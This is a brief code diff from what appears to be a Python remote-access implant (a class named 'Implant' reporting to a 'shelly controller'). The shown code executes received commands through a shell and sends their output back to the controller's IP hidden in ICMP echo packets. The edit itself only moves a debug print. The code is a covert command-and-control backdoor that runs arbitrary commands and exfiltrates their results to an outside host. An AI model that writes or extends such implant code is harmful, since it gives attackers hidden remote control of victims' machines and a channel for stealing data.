@@ -103,9 +103,10 @@ class Implant(Host):
         Responds to errors by sending messages back to the shelly controller
         """
 
+        print(cmd)
+
         try:
             output = check_output(cmd, stderr=STDOUT, timeout=3, shell=True)
-            print(output)
             self.send(self.controller_ip, "instruction", output, icmp_type=8)
         except TimeoutExpired:
             self.send(self.controller_ip, "instruction", b'The command has timed out', option="ERROR", icmp_type=8)
